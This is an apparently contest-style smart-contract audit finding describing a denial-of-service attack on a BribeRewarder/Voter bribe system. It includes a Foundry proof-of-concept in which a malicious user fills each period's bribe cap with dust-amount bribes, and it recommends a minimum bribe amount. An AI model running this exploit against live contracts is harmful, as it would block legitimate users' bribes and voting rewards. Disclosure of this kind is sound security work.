# Malicious users can block BribeRewarder's normal bribe operation

## Summary
BribeRewarder's _bride logic will call Voter's onRegister, inside onRegister a require check make sure that bribesPerPriod is no large than Constants.MAX_BRIBES_PER_POOL. 

```solidity
        require(_bribesPerPriod[periods[i]][pool].length + 1 <= Constants.MAX_BRIBES_PER_POOL, "too much bribes");
```
However, malicious users can exploit this check to block normal bribe operation by creating large number of brides to each period using dust amount token payment.

## Vulnerability Detail
Below steps show how malicious users can block normal bribe operation for a Voter and its pool.
1) Assume that Alice is a normal user, and Bob is a malicious user. 
2) Bob creates at least Constants.MAX_BRIBES_PER_POOL BribeRewarder instances using RewarderFactory
3) Bob use each BribeRewarder instances to call fundAndBribe, with a very large lastId but a very small amountPerPeriod.
4) By this malicious operations, Bob's BrideRewarders will fill up Voter's _bribesPerPriod from startId to a very large lastId. When Alice want to do her bribe operation, she will find out that almost every period can't  be used. Because for every period, the check inside Voter's onRegister about _bribesPerPriod will revert for exceeds Constants.MAX_BRIBES_PER_POOL.

Related PoC code is:
```solidity
        // â€¦
        // Create BribeRewarder and prepare tokens
        vm.startPrank(alice);
        rewarder = BribeRewarder(payable(address(factory.createBribeRewarder(rewardToken, address(_pool)))));
        vm.stopPrank();

        vm.startPrank(bob);
        for(int i = 0; i < 5; i++) {
            BribeRewarder tmp = BribeRewarder(payable(address(factory.createBribeRewarder(rewardToken, address(_pool)))));
            bobArray.push(payable(address(tmp)));
        }
        vm.stopPrank();

        vm.startPrank(DEV);
        ERC20Mock(address(rewardToken)).mint(bob, 20e18);
        ERC20Mock(address(rewardToken)).mint(alice, 20e18);
        vm.stopPrank();

        // Malicious Call
        // Bob do malicious bribe with dust amount of payment
       vm.startPrank(bob);
        for(uint256 i = 0; i < 5; i++) {
            BribeRewarder eachBR = BribeRewarder(bobArray[i]);
            ERC20Mock(address(rewardToken)).approve(address(eachBR), 20e18);
            // endId can be very large 
            eachBR.fundAndBribe(1, 50000, 1e1);
        }
        vm.stopPrank();

        // normal user alice can't do normal bribe
        vm.startPrank(alice);
        ERC20Mock(address(rewardToken)).approve(address(rewarder), 20e18);
        vm.expectRevert(bytes("too much bribes"));
        rewarder.fundAndBribe(1, 2, 10e18);
        vm.stopPrank();
```
## Impact
Malicious users can block Voter and pool's bribe operation using dust amount of funds.
Even though Voter owner could using startNewVotingPeriod call to skip hacked VotingPeriod, malicious users can still listen to this operation and block more VotingPeriod. 
Thusly, normal bribe, voting and reward process can't happens as expected.

Manual Review

## Recommendation
Set minimal bribe amount to prevent users doing dust amount of bribes
